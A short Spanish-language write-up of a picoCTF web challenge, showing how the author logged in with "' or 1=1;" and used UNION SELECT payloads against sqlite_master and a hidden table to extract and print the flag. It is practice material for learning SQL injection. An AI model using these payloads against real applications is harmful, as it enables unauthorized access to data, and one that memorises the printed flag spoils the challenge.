## Descripción
Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:58938/).
## Solución
usé "' or 1=1;" para logearme a la página.
busqué en la página que nos pasó el profe:
```
|Extract Database Structure (sqlite_version > 3.33.0)|`SELECT sql FROM sqlite_master`|
```
usé
```
' union SELECT sql,2,3 FROM sqlite_master ;
```
y me mostró las sentencias que se usaron para crear todas las tablas, en especial una que se llama more_table. Usé:
```
' union SELECT 1,2,flag FROM more_table ;
```
y me salió:
```
|City|Address|Phone|
|---|---|---|
|1|2|If you are here, you must have seen it|
|1|2|picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8b7cc2a}|
```
## Notas
[union] - se utiliza para combinar los resultados de dos o más sentencias `SELECT` en un único conjunto de resultados
## Referencias
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md